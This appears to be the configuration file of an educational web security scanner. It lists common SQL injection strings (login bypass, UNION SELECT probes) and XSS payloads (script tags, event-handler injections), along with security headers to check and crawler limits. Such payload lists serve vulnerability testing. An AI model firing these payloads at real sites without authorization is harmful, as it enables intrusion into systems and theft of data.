"""Configuration for the security scanner"""

# SQL Injection payloads
SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' or 1=1--",
    "' or 1=1#",
    "' or 1=1/*",
    "') or '1'='1--",
    "') or ('1'='1--",
    "1' ORDER BY 1--+",
    "1' ORDER BY 2--+",
    "1' ORDER BY 3--+",
    "1' UNION SELECT NULL--",
    "1' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
]

# XSS payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<keygen onfocus=alert('XSS') autofocus>",
    "<video><source onerror=alert('XSS')>",
    "<audio src=x onerror=alert('XSS')>",
    "<details open ontoggle=alert('XSS')>",
    "javascript:alert('XSS')",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<img src='x' onerror='alert(1)'>",
]

# Security headers to check
SECURITY_HEADERS = {
    'Strict-Transport-Security': {
        'description': 'HSTS - Forces HTTPS connections',
        'severity': 'high'
    },
    'Content-Security-Policy': {
        'description': 'CSP - Prevents XSS and injection attacks',
        'severity': 'high'
    },
    'X-Frame-Options': {
        'description': 'Prevents clickjacking attacks',
        'severity': 'medium'
    },
    'X-Content-Type-Options': {
        'description': 'Prevents MIME type sniffing',
        'severity': 'medium'
    },
    'X-XSS-Protection': {
        'description': 'Legacy XSS protection',
        'severity': 'low'
    },
    'Referrer-Policy': {
        'description': 'Controls referrer information',
        'severity': 'low'
    },
    'Permissions-Policy': {
        'description': 'Controls browser features',
        'severity': 'low'
    }
}

# Crawler settings
CRAWLER_CONFIG = {
    'max_depth': 3,
    'max_pages': 50,
    'timeout': 10,
    'user_agent': 'SecurityScanner/1.0 (Educational Purpose)',
    'respect_robots_txt': True,
    'delay_between_requests': 1  # seconds
}

# Scan settings
SCAN_CONFIG = {
    'enable_sql_injection': True,
    'enable_xss': True,
    'enable_header_check': True,
    'max_payload_tests': 5,  # Test first N payloads per input
    'timeout_per_test': 5  # seconds
}
